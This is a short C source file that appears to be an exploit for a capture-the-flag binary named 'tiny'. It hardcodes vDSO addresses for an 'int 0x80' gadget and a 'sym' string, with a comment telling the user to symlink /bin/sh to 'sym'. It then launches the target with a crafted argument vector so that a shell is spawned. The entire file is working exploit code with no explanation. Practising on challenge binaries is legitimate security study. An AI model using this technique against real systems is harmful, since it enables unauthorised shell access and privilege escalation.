#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>


#define VDSO_BASE (0xf773b000L)

// "sym\0" at VDSO, ln -sf /bin/sh sym
const uint32_t STR_ADDR = VDSO_BASE + 0xbe9;

// b36:	cd 80                	int    $0x80
//  b38:	90                   	nop
//  b39:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
const uint32_t INT80_ADDR = VDSO_BASE + 0xb36;

const uint32_t dummy = 0;

const char* _argv[] = {(char*)&INT80_ADDR, "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", 0};

int main(int argc, char** argv) {
    execve("/home/tiny/tiny", _argv, 0);
    perror("execev failed");
    return 0;
}